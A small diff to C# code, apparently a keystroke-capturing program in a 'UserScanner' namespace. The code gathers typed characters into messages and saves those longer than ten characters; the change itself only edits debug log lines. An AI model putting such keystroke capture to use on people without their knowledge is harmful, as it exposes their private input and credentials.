@@ -73,7 +73,7 @@ namespace UserScanner
           logger.Debug("ENTER");
           if (message.Length > 10)
           {
-            logger.Debug("Hooked message > 10: {0}", message);
+            logger.Debug("Hooked message: {0}", message);
             saver.save(message);
           }
           message = string.Empty;
@@ -83,7 +83,6 @@ namespace UserScanner
           var delay = (DateTime.Now - lastTimeMessageUpdate).TotalSeconds;
           if (delay > 1)
           {
-            logger.Debug("More than 1 sec");
             message = string.Empty;
           }
           message += keyChar;
